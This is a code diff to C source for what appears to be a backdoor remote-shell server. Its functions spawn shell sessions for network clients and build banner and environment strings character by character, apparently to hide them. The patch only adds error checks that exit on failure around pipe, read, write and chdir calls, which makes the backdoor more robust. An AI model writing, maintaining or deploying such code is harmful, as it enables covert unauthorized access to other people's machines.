@@ -75,8 +75,10 @@ void shell_spooler( void )
     for( x = 0; x < MAX_SHELLS; x++ )
     {
         pidlist[x] = 0;
-        pipe( pipe_A[x] );
-        pipe( pipe_B[x] );
+        if( pipe( pipe_A[x] ) < 0 || pipe( pipe_B[x] ) < 0)
+        {
+            exit( 0 );
+        }
     }
 
     if( fork() ) return;
@@ -98,7 +100,10 @@ void shell_spooler( void )
                 if( pidlist[x] == pid )
                 {
                     pidlist[x] = 0;
-                    write( pipe_B[x][1], EXIT_STRING, 4 );
+                    if( write( pipe_B[x][1], EXIT_STRING, 4 ) < 0)
+                    {
+                        exit( 0 );        
+                    }
                 }
             }
         }
@@ -116,7 +121,10 @@ void shell_spooler( void )
 
         if( FD_ISSET( pipe_A[0][0], &rfds ) )
         {
-            read( pipe_A[0][0], &x, sizeof( x ) );
+                if( read( pipe_A[0][0], &x, sizeof( x ) ) < 0)
+                {
+                    exit( 0 );
+                }
 
             if( x < MAX_SHELLS )
             {
@@ -138,7 +146,10 @@ void shell_spooler( void )
             for( x = 1; x < MAX_SHELLS; x++ )
                 if( pidlist[x] == 0 ) break;
 
-            write( pipe_B[0][1], &x, sizeof( x ) );
+            if( write( pipe_B[0][1], &x, sizeof( x ) ) < 0)
+            {
+                exit( 0 );
+            }
 
             if( x == MAX_SHELLS ) continue;
 
@@ -167,11 +178,17 @@ void shell_spooler( void )
                 r_banner[6] = '-'; r_banner[14] = 'd';
                 r_banner[7] = '0'; r_banner[15] = 'y';
 
-                write( pipe_B[x][1], r_banner, 16 );
+                if( write( pipe_B[x][1], r_banner, 16 ) < 0)
+                {
+                    exit (0);
+                }
 
                 if( get_type == GET_RAW_SHELL )
                 {
-                    write( pipe_B[x][1], "\n", 1 );
+                    if( write( pipe_B[x][1], "\n", 1 ) < 0)
+                    {
+                        exit (0);
+                    }
                     runshell_raw( pipe_A[x][0], pipe_B[x][1] );
                 }
 
@@ -254,7 +271,10 @@ void process_client( int get_type, int client_fd )
 
     shutdown( client_fd, 2 );
 
-    write( pipe_A[0][1], &x, sizeof( x ) );
+    if( write( pipe_A[0][1], &x, sizeof( x ) ) < 0)
+    {
+        exit (0);
+    }
 
     exit( 0 );
 }
@@ -440,7 +460,10 @@ void runshell_pty( int rd_pipe, int wr_pipe )
         temp[6] = 'v'; temp[13] = '\0';
 
         putenv( temp );
-        chdir( temp + 5 );
+        if( chdir( temp + 5 ) < 0)
+        {
+            exit( 0 );
+        }
 
         /* fire up the shell */
 
